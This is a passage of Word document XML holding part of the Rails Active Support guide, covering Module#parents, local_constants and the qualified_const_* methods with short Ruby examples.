    </w:p>
    <w:p w14:paraId="285A7007" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3.3.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>parents</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="308884DA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>parents</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> calls </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>parent</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on the receiver and upwards until </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Object</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is reached. The chain is returned in an array, from bottom to top:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5280"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="01B03802" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="005D5D8A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>X</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18DA2F68" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Y</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05596C12" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Z</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5293B4BA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07892CD4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3489843A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1AA27C4A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>M</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= X::Y::Z</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6686E6D7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6052BCA4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>X::Y::Z.parents # =&gt; [X::Y, X, Object]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="611BC70D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>M.parents       # =&gt; [X::Y, X, Object]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="606168FC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/module/introspection.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14057799" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.4 Constants</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30C9F037" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>local_constants</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns the names of the constants that have been defined in the receiver module:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5160"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4C0B7D98" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E113A55" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>X</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05F7AC3E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  X1</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09978671" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  X2</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= 2</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="150D4E35" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Y</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A7E00B9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    Y1</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= :y1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EEE9F43" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    X1</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= :overrides_X1_above</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73608FF3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A7F4979" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60328BE2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E2D50A5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>X.local_constants    # =&gt; [:X1, :X2, :Y]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B7B80DC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>X::Y.local_constants # =&gt; [:Y1, :X1]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6FDE0BDA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The names are returned as symbols. (The deprecated method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>local_constant_names</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns strings.)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3479B005" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/module/introspection.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B62732D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>3.4.1 Qualified Constant Names</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AE96A80" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The standard methods </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>const_defined?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>const_get</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> , and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>const_set</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> accept bare constant names. Active Support extends this </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to be able to pass relative qualified constant names.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77A79294" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The new methods are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>qualified_const_defined?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>qualified_const_get</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>qualified_const_set</w:t>
      </w:r>
      <w:r>
        <w:t>. Their arguments are assumed to be qualified constant names relative to their receiver:</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044AB30" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="72AF2F0C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Object.qualified_const_defined?("Math::PI")       # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="45ACE628" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Object.qualified_const_get("Math::PI")            # =&gt; 3.141592653589793</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15065DAE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Object.qualified_const_set("Math::Phi", 1.618034) # =&gt; 1.618034</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="55681525" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Arguments may be bare constant names:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6240"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="403C8474" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15001BF0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1161777835"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Math.qualified_const_get("E") # =&gt; 2.718281828459045</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6CB22DCE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">These methods are analogous to their builtin counterparts. In particular, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>qualified_constant_defined?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> accepts an optional second argument to be able to say whether you want the predicate to look in the ancestors. This flag is taken into account for each constant in the expression while walking down the path.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A94259C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>For example, given</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2040"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3A7F15B7" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="70738931" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>M</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B630D7F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  X</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42097BCE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00DF704C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16E3BAA6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>N</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="397C3E22" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>C</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E687CCC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    include M</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3988898F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4611F8B5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3870DEC7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>qualified_const_defined?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> behaves this way:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6960"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="71333E93" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5D1F5534" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>N.qualified_const_defined?("C::X", false) # =&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16148EB9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>N.qualified_const_defined?("C::X", true)  # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2DB41916" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>N.qualified_const_defined?("C::X")        # =&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="55F48895" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As the last example implies, the second argument defaults to true, as in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>const_defined?</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2128ADA6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For coherence with the builtin methods only relative paths are accepted. Absolute qualified constant names like </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>::Math::PI</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> raise </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>NameError</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="309A73E6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/module/qualified_const.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
